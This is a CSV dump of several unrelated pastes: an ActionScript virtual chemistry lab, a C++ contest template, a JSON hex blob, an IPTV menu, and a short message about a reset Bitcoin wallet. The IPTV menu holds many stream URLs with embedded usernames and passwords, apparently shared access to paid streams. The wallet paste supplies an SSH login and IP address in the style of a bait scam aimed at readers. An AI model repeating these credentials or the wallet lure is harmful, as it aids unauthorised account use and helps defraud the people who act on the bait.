id,title,username,language,date,content
66hE0Y7H,Untitled,kuykuin,ActionScript 3,Friday 24th of November 2023 06:02:52 AM CDT,"stop ();

function setup():void{
	vlab.objek(beaker);
	vlab.objek(tripod);
	vlab.objek(burner);
	vlab.objek(termometer);
	
	vlab.tombol (resetBtn, vlab.resetVlab);
	
	vlab.setLantai (590);
	
	beaker.drag = true;
	beaker.gravitasi = true;
	beaker.warna = ""putih"";
	
	tripod.drag = true;
	tripod.dragY = false;
	
	burner.drag = true;
	burner.dragY = false;
	
	termometer.drag = true;
	
	slider.nilaiMin = 20;
	slider.nilaiMax = 100;
	slider.nilai = 40;
	slider.update();
	
}

function update(e:Event):void{
	vlab.startVLab(setup);
	beaker.volume = slider.nilai;
	burner.menyala = onoff.on;
}

stage.addEventListener(Event.ENTER_FRAME, update);

// Function to stop the update function
function stopUpdate():void {
    stage.removeEventListener(Event.ENTER_FRAME, update);
}

// Event listener for navigation or cleanup
btn_exit.addEventListener(MouseEvent.CLICK, menuawalexit);

// Inside menuawal function or wherever you handle navigation or cleanup
function menuawalexit(e:MouseEvent):void {
    // Other cleanup tasks, if any
	//Runing Stop update
    stopUpdate();
	gotoAndPlay (1,""menustart"");
	
}"
qYykY7us,Untitled,clown1337,C++,Friday 24th of November 2023 06:02:04 AM CDT,"/*
 *                                                                                                                                     
 *                                        ░██▒▒░▒▒░░░░░░░░░░░░              ░████▓▓▓▓▒░  ░░▒▒▓███░                                   
 *                                         ▓█▓░░░▒▒░░░░░░░░░░░░░░░░░            ░░░░░░░░░░▒▓▒░▒▓░░░▓▓████░                               
 *                                      ▓█▒░░░▒▒░░▒░░░░░░░▒░░░░░░░░░░▒░  ░▒▒░░░░░░░░░ ░░░░░░░░░▓▒▒░░░░▒▒▒███                             
 *                                  ░▓▓░░░░▒░ ░▒░░░░░░░▒▒░░░░░░░░░░▒▒░░░░▓░░░░░░░░▒░░ ░░░  ░░░ ░░░░░  ░▒░░░██                           
 *                                 ░▓░░░░░░  ░░  ░░░░▒▒░░░░░░░░░░░ ░░░░░░▒▒░░░░░░░░░▒░░ ░░░░ ░░░  ░░░░   ░▓▒░ ▓█                         
 *                               ▒▓░ ░░░░      ░░  ░▒░ ░   ░░░ ░░  ▓░░░░░░░░░░▒   ░░▒░░   ░░░ ░░░  ░▒░░░   ▒▒░ ░▓░                       
 *                             █▓    ░   ░   ░░  ░░       ░░░  ░  ▒░░░░░░░░░░ ░░  ░░░▓░░    ░░░ ░░   ░░░░    ░░░ ░█                      
 *                         ░██▒            ░░  ░░░       ░░      ░▒░░░░░░░░░░  ▒░  ░░░▓░░  ░ ░░░       ░░░░   ░░  ░█▓                    
 *                      ███░    ░░        ░   ░░        ░░░      ▓      ░  ░░  ▒░     ░░░   ░            ░░░  ░░░░ ░▓█                   
 *                    ██░    ░░░        ░░              ░░      ░░     ░░   ░  ░░      ░░     ░   ░       ░ ░  ░░░░░░▓█                  
 *                 ░█▓    ░░░          ░      ░  ░              ▒      ░        ░ ░    ░░ ░░   ░░  ░░ ░░░  ░     ░░░░▒▓█▒                
 *            ░  ░█░   ░██▒░            ░░░░░   ▒░░   ░░       ░░      ░        ░░      ░░ ░░   ░░  ░   ░   ░░ ░  ░░░ ░▓█▓               
 *             ░▒░  ▓███▓      ░░     ░░░     ░░    ░░░      ░ ░                ░░ ░ ░   ░        ░  ░░ ░   ░▒░ ░░ ░░░░░▓█▒              
 *            ░░  ██░▓▓    ░ ░░     ▒░░      ░░░░  ░▒░      ░░ ░       ░         ░░   ░  ░   ░░░  ░ ░░░  ░   ░▒░ ░░  ░░░░██▒             
 *           ░░░██  ▒░  ▒░░░░    ░▒░░░      ░░░   ░▒░░    ░░░░       ░  ░░       ░   ░   ░   ░░░  ░░░░ ░  ░   ░▒░░░░  ▒▓▒░██░            
 *          ▓░██  ▓▒  ░░░░░░░  ▒▓░░░       ▒░ ░   ▒░░  ░ ░░░░░░░   ░    ░░        ░           ░░░ ░░ █░░░ ░░░░ ░▒░░░▓░ ░▓░░██            
 *        ▒██▓  ▓▓░   ▒▓░░░  ▓▓░░░░ ░░ ░  ░░░░   ▓░░░  ░ ░░░░      ░░░ ░░░  ░░ ░ ░░ ░ ░░░░ ░  ░░░  ░  █ ▒░ ░░   ░▒░░▓█  ▒▓░░██           
 *       ██▓  ▓█▒░░░▓▓░░░░ ▒▓▒░▒░  ▒░ ▒  ░▒░░   ░▒░░    ░░░░       ░░ ░░░░   ░ ░▒ ░░░░░░ ░ ░░ ░░░░ ░░ █░░░░░ ░░░ ░░░░██  ░▓░░██          
 *      ██   █░░░░▒▓░░░░ ░░▓░░▓░ ░▒░ ▓░░░░░     ▒░░░ ░░░▒░░░ ░  ░  ░░  ░░░   ░ ░▓ ░░░░░░ ░  █ ░░░░░░░  █ ▒░░░░ ▓░░░░░ ██  ░░▒███         
 *     █░  ██▒░▒▓▓░░░░ ░░█▒░░▒░ ▓▒░ ▓░ ░▒▒░░░ ░░▓░░  ░░░░░░░░░░ ░ ░░░░░░░░  ░░  █░ ░░░ ░░▒░ █░ ░░░░░░░ █░░░░░░ ░█░░▒░░▒██░ ░▒████        
 *    █   ██▒▒▓▒▒░░░ ░░▓▓▒░▒▓░░▒░░░▒▒ ▒░▒░░▒  ░▓░░░ ░▓▒▒░░▒ ▒▒  ░ ░░   ░░░ ░░▒░ ▒▒ ░░░░░░░░ ██ ░░░░░░░ ▒█ ░░░░░ ▓▒░▒░░ ████  ░████       
 *       ██░▒░░▒▒▒░░▓░▓▒░░▒▒░▒░▒░░▒█░░░░▒░░▓  ░▒░▒░ ▓░▒▓░▓▓░▓▒  ▓ ░░░░░▒▒▓ ▒▓▓░ ░█ ░░░░░░▒░ ██ ░▒▓░░░░░ █░░░░░▒░ █░▒▒░▒░███▓▒▓███        
 *     ░██░▒▒░▒░░ ▒▒▒▓▒▒▒▒░░▓ ▒▓░░█▒ ░░▒░░▓  ░▒▒░▓ ░▓▒▓▒░▒▓░▓░ ░█ ▓░░░░▓▒▓░░▓▒░  █ ░▓▒░░░▒▒ ██░ ░▓▒░░▒░ █▒░▒░░░░░█░░▒░░░█████████        
 *    ░█▓░▓▓░░░░░▓▒░▒▒░▒░░▒▓░░▒░░██ ░░░░░ █ ░░░░░▓ ▓▒░▒░░▒▒░▓░ ░█ ▓░▒░░▓▒▓░░▓▒░░ █  ▓▓░░░▒▒ ▓▓█ ░▓▒░▒▓░░░█ ░░▒░░▓▓▓ ░░▒▓▓█████░██        
 *    ░███▒░░░░██▓░▒░░▒░░▓▓░░▒░░▓█▓░▒░▒▓░▓▓ ▓░▒▒▓░ █░▒▒░▒▒▒░▓  ░▓ ▓▒▒░░▒░▒░░▒░░░ █  ░▒▒░▒▓▒ █░█ ░▓░▒░▒░▒ █░▒▒▒▒░░░█░░▒▓█▓▓███▓▓██        
 *      ██▒░░▓██░░░▒▒▒░░▓█░░▒░░▒██ ▒░░▒▓ █░ ▓▒▒░▓ ▓▓░▒▒░▒▒▒▒▓ ░░▓ ▓▒▒░░▓░▒▒░▓▒░░ █  ▓▒▒░░▒▒ █ █░ ▓░▒▒▒▒▒ █▓░▒▒░░░░██▓██████▓▓▓███        
 *       ██████░░░░▒░░░▓█░░▒▒░░██ ▒▒░▒▒░░█ ░░░▒░▓ █░░▒▒░▒▒░▓▓ ░░▓░▒▒▒░▒▒▒░▒░▒▒░░ █░ ▓▒▒░░░░ █ █▓ ▓▒▒▒░░░░██░░░▒░▒▓██▓███ ██▓▓██░█        
 *        ▓███▓▒▒░▒░░ ██░░▒░░░███░▓░░▒▓ ██ ▓▒░▒▒▒ █░▒▒▒░░░░▒▓  ░▓░▓░▒░▓▓▒░░▒▒▒░▒ █░ ▒░░░▓██░█ ██ ░░░░░▒░▓▓█░░░░▒██████   ██▒███ █        
 *         ░█▓██▓░▒░ ██▓ ▒▒░░▓██ ░░░▒▒▓ █░ ▓▒▒░▓ █▓░▒░▓░░░▒▓█   ▓░▒░▒▒▓▓▓▓░▒▒░▒▒ █░░███▓▓▒░ █ █████▓▓ ▓░█▒█▓░░░▓█████   ███░█▓█ █        
 *        ▒██▓█▓░░░░███ ▒░░░▒███▒▒░░▒▒▒ █ ░▓▒░▒▓ █ ▒▓░▒░▒░▓▒▓░  █░▓░░▓█▓▓▓░▓░▒▓░ █▒░██ ▒▒░░░█  █ ▒░▒█ █░███▓░▒▒████▓   ▒▓█▓░█▓░░█        
 *        ████▓▓▓▒▒███ ░░░░░███ ░░▒▒▒▒ ░█ ▓▒░░▒▒ █ ░░░░▓██████  █ █░░██▓▓▓░█░▒█░ █▓░██░██▓░▒█  ██████ ██████▒█▓████  ░ ▒░█ ███ ██        
 *          ███▓█████▒▒▒░░░████▒░░▒▒▒▓ ██ █░░░▓ ▓█ ░████▒▓█▒▓▓  █ █░▒█▓▓▓█░█░▓▓  ▓▓▓ █▓██████  ██░███   ▓███▓█████▓  ░▓░██ █░░ █▓        
 *            ███████░▓▒░░▓███░░░░▒░▒▒ █▓ █▒░░█ ████▓▓▓▓  ██▓▓  ▓ █████████████  ░███████████████▓      ████▓██▓██  ░░▒ █░░█▒░ █         
 *              ████░█▓▒▓▒█████░░░░▒▒▒ █ ██▓▓▓█░████████ ░███████░████████▓░███      █        ▓█████▓   █████▓▓▒██  ░▓▒▒█ █▓░▒ █         
 *                ██▓▓▒▓▓▓█████▒░░░░▒░ █ █▓████ █░░▓   ███████ ▓░                       █  ░██████████▓ ░▓███▓▓██▓  ░▓░▓█ █░▒░▒█         
 *                ██▓▒▒█▓███████▒▒░░▓  █░█▓██████    █████████▓                        █████████████░ ██  ███▓▓██  ░▒▓░█ ▒█ █ ██         
 *               ███████████████▒▓▒░░░▒█████▓▓██░  ███    ██████                       ██▓███████████  ██ ██▓▓███  ░▓░░█ █▓░▓ █          
 *              ░█▓▒▓░█▓█████▒██▓▓▓░▒▓▓▓▓███████  ███    ███████                       ██▓████████░██  █████▓▓██░  ▒▓░█ ▒█ ▓░░█          
 *                      ░████░██▒▓█▓▓██▓▓▓▓████  ██▓█████████████                       █  ██████  ▒█  ░ ▓██▓█▒█  ░░▒░▓ ▒█ ▓░██          
 *                      ██▓▒█▓▓█▓▓█▒▓█▓▓▓█▓▓▓██  ██ ██████████░░█                       █   ████   █     ███▓█ █ ░▒▒░█ ░█  ░░██          
 *                      ██▒▓████████████▓███░██ ▓█  ███████████░█                        ▒        ▒      ████░█  ░░▒▓▒░░█ ░░▒██          
 *                      ██░███████▒░█░█████████ ██   █  ██████  █                         ████████▓      ████ █ ░▓░░█░░█░ ▒░██▓          
 *       ████░          █▓ ███████░ ██░█████████  █  ▓█   ███   ▓                                        ███ █  ▓▒░▓▒░░█ ░▒░██░          
 *    ░██              ██░ ███████░ ██░ ████████       █░     ░██                                        ██▓ ▓ ░▒▒▒▓▒░▒█ ▒░▓██░          
 *                     ██░▓████▒▓██░ ██ ░████████       ░█████▒                                          ██░░  ░▓▒▓░░ █  ▓░███           
 *             ░██     ██░█████▓ ██▒ ▓█░ ▓██▒████                            ░                          ██▓░  ░▒▒▒░░░ █ ░▒░███           
 *      ████████      ▓██░█████▒ ███  ██ ░▓██▓███                                                     ████▒   ░▓▒▒░░ ██ ▓░░███           
 *                    █ █▓████▓  ▓██  ░█▓ ░▒█▓█████                                                 ██████░  ░▓▓▒░░░░██ ▓░░█▓█           
 *   ▓                █ █▓███▓█  ░██▓ ░▓█ ░ ████████▒                                             ████████  ░▒▓▒░ ▒░███ ▓░██▒█           
 *   ▓█          ▒    █ █▓███▒▓░ ░███ ░▒░█░ ░█▓███████                                         ██████████▒  ░▒▒▒░░█░███ ▒░██░█           
 *        ██    █░██ ░█ █▓██▓▓ ▓  ███░ ░▓█▓  ██▓█████████                                   █████████████  ░░▓▒▓ ▓░▓███ ▒░██▒█           
 *         █  █░█ ██ █  ████░▓ █  ████  ▒░█░ ▒█▓█████████████                           ░████████████████  ░▒▓▒ ░█ ████ ▒░██▓█           
 *         ███   ▓   █  ███▓░ ▓█  █████ ▓▒▓█  ██▓██████████████████▓                ▓████░  ████████████░ ░░▒▒▒░▓░▓████ ░░██▓█           
 *      ███ █        █  ███▒▓ ▒▓  █████  ▒▒█░ ██▓███████████████████░▓████████████████▓   ████  ████████  ░░▒▒░░█ █████ ░░██▓░█          
 *     █░   █▒       █  ███░░▒▓▒  ██████ ░░░█ ░██▓█████████████████   ░█░ ░▒▒▒░░░         ██   ████████▒ ░░░▓░░█ ▓█████ ░░███░█          
 *          ██████░  █  ██░░░░▓░  ██████▓ ▒░▓░ ██▓▓████████████████      ░           ░█▓░      ████████░▒░░▒▒░█░ ██████ ░░███ █          
 *   ░   █████   ▓▓  █  ██░░░▒▓░  ███████  ░▒█ ▓██▓████████████████         ░░    █            ████████ ░░░▒░░█ ▓██████ ░░███░█          
 *   ▓   █   █        █ █░░░░▓▓  ░████████ ░░░░ ██▓▓█████████████░  ░███████▓██  ██████▓████    ██████░░▒░▒░░█░ ███████ ░░███░█          
 *   ▓█  █████        █ █ ░░░▒▒░ ░████████▓░░▓█ ░██▓▓█████████      █▒▒░░░░░░▓█▓▓█░ ▒▓▓░░░░▓█      ███ ░░░▒░▒█ ████████░░░███░██         
 *                    ██▓░▓▒▒▓░░ ▓█▓███████░░░▓░ ██▓▓███████▒  ░   █▓░░░░██▓▓▓▓░░███▓▓▒▓█▓░░█    █  █▓░░▒░░░█░ ████████▒ ▒█▓█▒▓█         
 *                    ██ ▒▓░░▓░░ ██░░███████ ░░▓  ██▓▒███▒      █  ░█░░██░░░  ░▓█░  ░░░░░░██░   ░▓ ▒█░░▒▒▒░▓▓ █████████▒ ░█▓▒▓░█         
 *                    ██ ▓▓ ▒▓░░ ██  ████████░░▒▓ ▒███▓██ ▓█    ██  ▓██░░░░ ████████▒░░░░░█        ██░░▓░▒░█░▒█████████▓ ▒██ █ ██        
 *        ██          █░░█▓ ▓▒▓  ██  █████████░░░░ ██▓▓▓██░█     ██  ░▓░ ░█████▓██▓ █▓░░ █    █░   █▓░▒░░░▓█░█░█████████ ▒█▓ █░██        
 *       ██           █░░█▓░▓░▓  ██  ████░   █░░░▒  ██▓▓▓█▓█▒ ░    █ ▓█████░░█▒ ▓██░ ░████▓ ░█    ▒█░░█░░░█░██   ▓██████ ░█▓ █░▓█        
 *       █            █░░█▒░▓░▓  ██  ░██     ██░▒ ▓ ░███▓██▓▒  ░░  ░▒▒░░▓   ██    ░█░░░░  ██      ██ █▒░░▓█ █░      ████ ░█▓ ▓▓▓██       
 *      ░█           █▓░▓█▒░▒░▓  ██   █░      ██░▓ ░ ▓███▓██▓   ░░ ██▓██▓▒░░██     █░░▓▒▓█▓▓█  ░ ░█░ █░░░█░██  ░      ██ ░█▓  █░██       
 *      ░█           █▓░█▓▒░▒▒▓  ██  ░█       ░█░░▓░  ██▓█▓██░    ░   ▒  █░█  ▓ ▓░ ░█░▓ ░▒░▓██   ▓█ █▒░░▒█░█           █░░██  █░▓█       
 *       ██          █░▓▒▓▒ ▓░▓  ██  █         ██ ▒▒░ ░██▓███▓        ░░  ██  █ █▓░ ██ ░░        █░░█░▒░█░▓█           ██░█▓  █▓▓██      
 *        ██         █░█ █░ ▓▒▓  ██░            █▓ ▓▒░ ██▓▓███             █  █     █            █░█▒▒░▒█░█▓  ░         █ ▒█░  █░██    █ 
 *         ██        █░█ █░ ▓▒▓  ███            ██  ▒▒░ ██▓▓▓██               █                 █▓██░░ █░▒█░ ░          █ ▒█▒  █ ██    ▓ 
 *          ▓          █ ▒       ██              ██      ██░░▓█                                 ▓ ░   ░▒ ▓█            ▒█  ▓      ▓      
 *
 *
 *
 *
 *
 * */

#include <algorithm>
#include <bitset>
#include <cassert>
#include <cmath>
#include <cstring>
#include <deque>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <limits>
#include <map>
#include <numeric>
#include <ostream>
#include <queue>
#include <random>
#include <set>
#include <sstream>
#include <stack>
#include <string>
#include <unordered_map>
#include <unordered_set>
#include <vector>

using namespace std;
/// Pragmas ///
#pragma GCC optimize(""Ofast, O3, unroll-loops"")
#pragma GCC target(""sse,sse2,sse3,ssse3,sse4,popcnt,abm,mmx,avx,avx2,fma"")
/// Defines ///
typedef long long ll;
/// consts ///
long long N = 100100;
vector<bool> used(N);
vector<vector<int>> g(N);
vector<int> dist(N);
vector<int> isPrime(N, true);
/// Geometry ///
struct Vector {
  double x, y;
  Vector() {}
  Vector(double x1, double y1) {
    x = x1;
    y = y1;
  }
  Vector(Vector a, Vector b) {
    x = b.x - a.x;
    y = b.y - a.y;
  }
  Vector operator+(Vector other) const {
    return Vector(x + other.x, y + other.y);
  }
  Vector operator-(Vector other) const {
    return Vector(x - other.x, y - other.y);
  }
  Vector operator*(double d) { return Vector(x * d, y * d); }
  double operator*(Vector other) const { return x * other.x + y * other.y; }
  long long operator^(Vector other) const { return x * other.y - y * other.x; }
  long long len2() { return x * x + y * y; }
  long long len() { return sqrt(len2()); }
};
typedef Vector Point;
double Angle(Vector a, Vector b) { return atan2(a ^ b, a * b); }

double Dist(Vector a, Vector b) { return Vector(a, b).len(); }

double Area(Point a, Point b, Point c) {
  Vector ab(a, b);
  Vector ac(a, c);
  return (double)abs(ab ^ ac) / 2;
}

istream &operator>>(istream &in, Point &p) {
  in >> p.x >> p.y;
  return in;
}

ostream &operator<<(ostream &out, Point p) {
  out << p.x << ' ' << p.y;
  return out;
}
/// GCD & LCM ///
ll gcd(ll a, ll b) { return (b ? gcd(b, a % b) : a); }

ll lcm(ll a, ll b) { return a / gcd(a, b) * b; }
/// DFS ///
void dfs(int v) {
  used[v] = true;
  for (int i = 0; i < g[v].size(); i++) {
    int u = g[v][i];
    if (!used[u])
      dfs(u);
  }
}
/// BFS ///
void bfs(int start, int end) {
  dist[start] = 0;
  used[start] = true;
  queue<int> q;
  q.push(start);
  while (!q.empty()) {
    int v = q.front();
    q.pop();
    for (int i = 0; i < g[v].size(); i++) {
      int u = g[v][i];
      if (dist[v] + 1 < dist[u]) {
        used[u] = true;
        dist[u] = dist[v] + 1;
        q.push(u);
      }
    }
  }
}
/// SIEVE ///
void sieve() {
  isPrime[0] = isPrime[1] = false;
  for (int i = 2; i < N; i++) {
    if (isPrime[i]) {
      for (int j = i * i; j < N; j += i) {
        isPrime[j] = false;
      }
    }
  }
}
/// CountDivs ///
vector<int> divs;
int countDivs(int n) {
  int cnt = 2;
  divs.push_back(1);
  divs.push_back(n);
  for (int i = 2; i * i <= n; i++) {
    if (n % i == 0) {
      cnt += 2;
      divs.push_back(i);
      divs.push_back(n / i);
      if (i * i == n) {
        cnt--;
        divs.pop_back();
      }
    }
  }
  return cnt;
}
/// BinPow ///
ll binPow(ll x, ll n) {
  if (n == 0) {
    return 1;
  }
  if (n % 2 == 0) {
    ll a = binPow(x, n / 2);
    return a * a;
  } else {
    ll a = binPow(x, n - 1);
    return x * a;
  }
}
/// Extended Euclid algorithm ///
int gcdExtended(int a, int b, int *x, int *y) {
  if (a == 0) {
    *x = 0;
    *y = 1;
    return b;
  }
  int x1, y1;
  int gcd = gcdExtended(b % a, a, &x1, &y1);
  *x = y1 - (b / a) * x1;
  *y = x1;
  return gcd;
}
///

void solve() {}

signed main() {
  ios_base::sync_with_stdio(false);
  cin.tie(NULL);
  cout.tie(NULL);
  int t = 1;
  // cin >> t;
  while (t--)
    solve();
  return 0;
}"
ZxPnSp7Z,data762,TestGuy1,JSON,Friday 24th of November 2023 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '67fd8a1f714c49efb70f60f1ceee4e03810480cbcab205a1f6d9c6b6330216b11542fc6ee02134ce30b54789ceb9a7997fcb21c8ed4e2924bc53e38aa78ac4ccc151a295404529fbe2f5f195d075f9a8bda8d19f6cf31110a1a0bfe0c33440b3ca5527d7d1c0b688919b2b247e225ec91193b21d2172f9ebbdbd8d6431015498',
  otherdata: [
    '51499d5f7bd22055bc692fd175b5eda9',
    '26b56e5399dac0777443da12b12cb9b1',
    '6f6c23a8c3e732854ccf3a9817bbc5be',
    'c9b7ceb090a4eab26be9b8a70087c6f7',
    '129c20d6e8de19183147ac3d2492f40e',
    '8150da1572955eccaa5e45eeae3e84f9',
    '313bc0fc6825f241ed9d53615ccba22a',
    'b9c4bfabcc97b0933d9d2a1502df764f'
  ]
}"
ap3Uj5Ck,Menu Iptvs,jaguenk,JSON,Friday 24th of November 2023 05:48:21 AM CDT,"{
""name"": ""IptVs"",
""author"": ""🅰️🅵1🅲🅸🅾️🅽🅰️🅳🅾️🆂"",
""image"": ""https://giffiles.alphacoders.com/211/211426.gif"",
""url"": ""https://pastebin.com/ap3Uj5Ck"",
""telegram"": ""Lista_AF1CIONADOS"",
""info"":"""",
""groups"":
    [
        {
         ""name"": ""IPTV 01"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://xcm.budtv-ultra.com:25461/get.php?username=JW2WBsjv3sgQaDTHs&password=sjqvgRauPbjj&type=m3u"",
         ""info"":""150 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 02"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
         ""url"": ""http://pinkpanther.uk:8080/get.php?username=restreamwellfrank&password=2NhhmrhTDGaGxVyZX9wpKv4twh9EAZqa&type=m3u_plus"",
         ""info"":""150 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 03"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://proiptvdigic.com:8080/get.php?username=tviritv&password=td6522SNAtHt&type=m3u_plus"",
         ""info"":""200 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 04"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
         ""url"": ""http://topiptv.net/get.php?username=4670115788&password=5623525065&type=m3u"",
         ""info"":""200 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 05"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://xcm.budtv-ultra.com:25461/get.php?username=JW2WBJW2WBOndemand2023&password=d8rQEH2h4E&type=m3u"",
         ""info"": ""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 06"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
         ""url"": ""http://relectro.xyz:8080/get.php?username=JoseWeib-TV&password=A5wjQDud0T&type=m3u_plus"",
         ""info"":""500 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 07"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://magmas5.com:8000/get.php?username=7H9YAQYZU5&password=12NXDP0KJP&type=m3u"",
         ""info"":""1000 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 08"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
         ""url"": ""http://flashprinttv.com:2086/get.php?username=gPAckvByDfYR&password=jXLwp4yFjGHS&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 09"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://xplatinmedia.com:8080/get.php?username=@JKDpros&password=2jLwS6gtxZ2a&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 10"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
         ""url"": ""http://flashprinttv.com:2086/get.php?username=Juan4ds&password=ky4FbrykJKkZ&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 11"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://proiptvdigic.com:8080/get.php?username=mlml2022&password=2X8t783vmdnt&type=m3u_plus"",
         ""info"":""50 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 12"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
        ""url"": ""http://pinkpanther.uk:8080/get.php?username=restreamwellfrank&password=2NhhmrhTDGaGxVyZX9wpKv4twh9EAZqa&type=m3u_plus"",
         ""info"":""150 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 13"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://00322.xyz:8000/get.php?username=VoDLatiecu&password=X4PFWWVSX8&type=m3u_plus"",
         ""info"":""50 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV 14"",
         ""image"": ""https://i.postimg.cc/Ls8C0MHW/tv-espa-a-new.png"",
       	 ""url"": ""http://zona593ec.online:8080/get.php?username=Jhontv&password=Jhon20231@&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 01 [LMP]"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://31.42.185.216:8000/get.php?username=StratusTV&password=3PXZ2K5ECT&type=m3u_plus"",
         ""info"":""500 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 02 [LMP]"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://31.42.185.216:8000/get.php?username=LocalRestreamIntercambio&password=GX3FMT14FH&type=m3u_plus"",
         ""info"":""200 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 03"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://185.155.103.50:2095/get.php?username=UzielLCH&password=UzielLCH&type=m3u_plus"",
         ""info"":""200 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 04"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://138.255.102.3:25461/get.php?username=FOXSPORTS1HDsd&password=RRZKamZw9a&type=m3u_plus&output=mpegts"",
         ""info"":""1000 conex"",
         ""import"": false
        },	
		{
         ""name"": ""IPTV Latino 05"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://tv.fullytv.com/get.php?username=ViPstre@mer&password=@u4uhdiQW456&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },	
		{
         ""name"": ""IPTV Latino 06"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://tv.fullytv.com/get.php?username=ViPstre@mer&password=@u4uhdiQW456&type=m3u_plus"",
         ""info"":""19 conex"",
         ""import"": false
        },		
		{
         ""name"": ""IPTV Latino 07"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://extremeplus.xyz:8080/get.php?username=miarea&password=VfVbMyh38f&type=m3u_plus"",
         ""info"":""500 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 08"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://00322.xyz:8000/get.php?username=VeoTV&password=KN4KH0FWDJ&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 09"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://extremeplus.xyz:8080/get.php?username=astramx77&password=3YBEAQLK76&type=m3u_plus"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 10"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://xcm.budtv-ultra.com:25461/get.php?username=JW2WBsjv3sgQaDTHs&password=sjqvgRauPbjj&type=m3u_plus"",
         ""info"":""200 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 11"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://proiptvdigic.com:8080/get.php?username=go69chia&password=HswnrKHfN35v&type=m3u_plus"",
         ""info"":""300 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 12"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://proiptvdigic.com:8080/get.php?username=mlml2022&password=2X8t783vmdnt&type=m3u_plus"",
         ""info"":""50 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 24/7"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://tv.iprotv.live:25461/get.php?username=247lamqnsiondelterror2&password=v60A6OP6Pvd&type=m3u_plus"",
         ""info"":""700 conex"",
         ""import"": false
        },
		{
         ""name"": ""IPTV Latino 24/7"",
         ""image"": ""https://i.postimg.cc/XJ5VhtB0/World-new.png"",
         ""url"": ""http://amepz.xyz:2052/get.php?username=dltbshakt67&password=74PPw2bhhAN3&type=m3u_plus&output=m3u8"",
         ""info"":""100 conex"",
         ""import"": false
        },
		{
         ""name"": ""Pluto TV"",
         ""image"": ""https://i.postimg.cc/d19c10Dk/pluto-tv-new.png"",
         ""url"": ""https://raw.githubusercontent.com/yIsus-mEx/AF1CIONADOS/main/PlutoTV"",
         ""info"":"""",
         ""import"": false
        },
		{
         ""name"": ""TDTChannels"",
         ""image"": ""https://i.postimg.cc/Tw5q5fjS/TDT-new.png"",
         ""url"": ""https://pastebin.com/UWXsWLF9"",
         ""info"":"""",
         ""import"": false
        }
    ]
}"
87g2s0hw,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Friday 24th of November 2023 05:33:14 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

